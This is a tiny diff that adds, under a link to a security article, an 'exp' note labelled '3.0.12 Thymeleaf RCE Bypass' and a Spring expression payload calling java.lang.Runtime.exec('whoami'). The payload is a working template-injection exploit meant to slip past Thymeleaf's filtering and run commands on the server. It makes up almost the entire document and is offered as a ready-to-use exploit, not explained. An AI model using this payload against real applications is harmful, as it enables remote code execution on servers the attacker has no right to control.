@@ -1,1 +1,6 @@
 https://paper.seebug.org/1332/
+
+exp:
+3.0.12 Thymeleaf RCE Bypass
+${T (java.lang.Runtime).getRuntime().exec("whoami")}
+
